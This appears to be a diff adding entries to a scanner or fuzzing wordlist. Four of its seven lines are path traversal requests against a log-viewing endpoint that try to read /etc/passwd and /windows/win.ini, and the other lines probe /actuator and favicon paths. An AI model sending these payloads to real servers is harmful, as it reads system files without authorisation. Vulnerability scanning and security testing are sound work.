@@ -1,0 +1,7 @@
+/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
+/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
+/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
+/log/view?filename=/etc/passwd&base=../../../../../../../../../../
+/actuator
+/favicon.ico
+/actuator/favicon.ico
